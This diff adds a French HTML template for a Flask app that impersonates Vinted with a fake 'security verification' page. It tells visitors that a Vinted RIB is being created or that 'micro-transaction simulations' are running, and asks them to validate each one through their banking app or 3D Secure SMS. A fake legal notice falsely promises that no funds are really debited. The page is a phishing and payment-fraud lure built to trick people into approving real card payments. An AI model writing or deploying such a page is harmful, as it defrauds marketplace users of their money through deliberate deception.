@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Simulation de Sécurité - Vinted</title>
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+    body {
+        font-family: 'Roboto', Arial, sans-serif;
+        background-color: #f0f2f5;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        margin: 0;
+        color: #333;
+        text-align: center;
+    }
+    .container {
+        background-color: #fff;
+        padding: 30px;
+        border-radius: 8px;
+        box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+        width: 100%;
+        max-width: 650px;
+        box-sizing: border-box;
+    }
+    h2 { color: #007b76; margin-bottom: 20px; }
+    .option-section {
+        border: 1px solid #ddd;
+        background-color: #f9f9f9;
+        border-radius: 6px;
+        padding: 15px 20px;
+        margin-bottom: 20px;
+        cursor: pointer;
+        transition: all 0.3s ease;
+    }
+    .option-section:hover { border-color: #007b76; background-color: #f0fff0; }
+    .action-button {
+        display: block;
+        width: 100%;
+        padding: 12px;
+        background-color: #007b76;
+        color: white;
+        border: none;
+        border-radius: 4px;
+        font-weight: bold;
+        font-size: 1em;
+        cursor: pointer;
+        margin-top: 15px;
+    }
+    .action-button:hover:not(:disabled) { background-color: #005e5a; }
+    .secondary-button { background-color: #888; }
+    .secondary-button:hover:not(:disabled) { background-color: #666; }
+    .section-content { display: none; margin-top: 20px; text-align: left; }
+    .section-content p { margin-bottom: 10px; }
+    .highlight-text { font-weight: bold; color: #007b76; }
+    .legal-warning {
+        background-color: #ffebe6;
+        border: 1px solid #dc3545;
+        border-radius: 5px;
+        padding: 12px;
+        margin-top: 25px;
+        text-align: left;
+        font-size: 0.8em;
+        color: #dc3545;
+    }
+</style>
+</head>
+<body>
+<div class="container">
+    <h2>Finalisation de la Vérification de Sécurité</h2>
+
+    <div id="rib-section" class="section-content">
+        <h3>Votre RIB Vinted</h3>
+        <p>Votre nouveau RIB Vinted est en cours de fabrication et vous sera envoyé par SMS ou e-mail.</p>
+        <p>Cette étape permet de sécuriser les fonds et d’activer les virements.</p>
+        <button class="action-button" id="rib-continue">Continuer</button>
+    </div>
+
+    <div id="cb-section" class="section-content">
+        <h3>Simulation 3D Secure</h3>
+        <p>Simulations de micro-transactions en cours...</p>
+        <p>Validez chaque simulation de transaction via votre application bancaire ou SMS pour confirmer la sécurité de votre carte.</p>
+        <button class="action-button" id="cb-continue">Continuer</button>
+    </div>
+
+    <div class="legal-warning">
+        <strong>INFORMATION IMPORTANTE</strong>
+        <p>Toute simulation de micro-transaction ou création de compte de garantie vise uniquement à la vérification d'identité et à la sécurité. Les fonds ne sont pas débités définitivement mais annulés ou re-routés.</p>
+    </div>
+</div>
+
+<script>
+document.addEventListener('DOMContentLoaded', () => {
+    const type = "{{ type }}"; // récupéré depuis Flask
+    const ribSection = document.getElementById('rib-section');
+    const cbSection = document.getElementById('cb-section');
+
+    if (type === "rib") {
+        ribSection.style.display = 'block';
+    } else if (type === "cb") {
+        cbSection.style.display = 'block';
+    }
+
+    document.getElementById('rib-continue').addEventListener('click', () => {
+        alert('RIB validé, vous pouvez continuer !');
+    });
+
+    document.getElementById('cb-continue').addEventListener('click', () => {
+        alert('3D Secure validé, vous pouvez continuer !');
+    });
+});
+</script>
+</body>
+</html>
